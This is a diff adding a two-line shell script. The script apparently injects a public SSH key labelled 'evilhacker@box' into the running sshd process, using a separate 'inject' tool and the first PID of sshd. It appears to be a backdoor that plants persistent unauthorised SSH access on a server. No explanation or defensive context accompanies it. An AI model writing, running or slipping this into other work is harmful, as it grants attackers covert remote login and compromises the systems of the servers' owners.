@@ -1,0 +1,2 @@
+#!/bin/sh
+./inject `pidof sshd| awk '{ print $1 }'` "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC97SePu7MbV7diFULSAFUlALMKw53UDMc25MZZY0iaWxtdQDM5Ses+X6HfcDuEG+6KcSSTe3PqS8hfMDa6oCx972GTT2/BMrIGWDw3uZiDYBKyPdNpTkvM9D5a+Gfq0VE1vcIHqOU/qfk8CQQ/BoTl3G+le/Fi8ysssmSKrJHukJUzIJU3yK82urR187nIVZg8RFrDsMET3atnjoxy/ovMAMKe3s7saUcig/Trpu25r3TbC118uNG7QrXJTiZa4e4DFHOx8h9fKwV7yQfWGK3AITxRzhHmeg5SfmRgZdTVbwaxcpWK4907CXje9uDwBMheF7iBdpj4rlmZNffYlaFj evilhacker@box"
